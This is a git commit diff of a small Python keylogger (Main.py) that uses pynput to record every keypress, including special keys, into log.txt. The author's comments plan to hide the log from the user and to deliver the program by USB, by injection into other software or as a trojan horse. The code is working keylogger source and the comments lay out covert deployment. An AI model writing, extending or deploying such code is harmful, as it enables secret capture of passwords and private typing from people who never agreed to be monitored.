59bd35695951995ce057be00cf24b3200d1a16b9
Alejandro Sandoval <asandoval2540@gmail.com>
2026-02-26 12:43:39 -0600

    Add files via upload

--- Main.py
+++ Main.py
@@ -5,21 +5,23 @@ import pynput
 from pynput import keyboard
 
 # How do you make sure the user doesn't see this? ** Hidden files **
-# Also this doesn't gurantee that there is a log.txt
-# Figure out how to get special characters
+# Also this doesn't gurantee that there is a log.txt - 
+# Figure out how to get special characters - DONE
+
 #Function to log key presses
 def Keypress(key):
     print(str(key))
-    with open("log.txt", "a") as logKey:   #Open log file to write
+    with open("log.txt", "a") as logKey:   #Open log file to append to
         try:
             char = key.char
             logKey.write(char)
-        except:
-            print("Error logging key")   # If this is shown, it means the key is not a character (space, enter, etc.)
+        except AttributeError:
+            logKey.write(f"[{str(key).replace('Key.', '')}]") # This is for special keys like space, enter, etc. It will write them in brackets and remove the "Key." part for better readability.
+
 
 # Software or hardware implemented? 
 # USB, inject it into a software, or make trojan horse
-# Main function (Used to listen)        
+#Main function (Used to listen)        
 if __name__ == "__main__":
     listner = keyboard.Listener(on_press=Keypress)
     listner.start()
